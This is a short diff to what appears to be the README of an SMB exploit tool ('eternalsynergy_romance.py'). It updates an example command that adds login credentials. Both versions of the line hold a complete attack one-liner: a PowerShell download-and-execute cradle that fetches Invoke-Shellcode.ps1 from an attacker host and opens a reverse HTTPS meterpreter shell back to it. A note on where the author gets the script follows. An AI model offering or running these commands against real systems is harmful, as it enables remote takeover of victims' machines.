@@ -56,6 +56,6 @@ Example for spawning an Empire agent:
 
 Example for spawning a meterpreter session:
 
-`python eternalsynergy_romance.py 192.168.178.2 netlogon "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.3/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.3 -Lport 8443 -Force \""`
+`python eternalsynergy_romance.py 192.168.178.2 netlogon "testuser" !Password123 "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.3/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.3 -Lport 8443 -Force \""`
 
 (I typically grab Invoke-Shellcode.ps1 from http://bit.ly/2cuWJTF, but that only works when the target has an unfiltered outbound connection.)
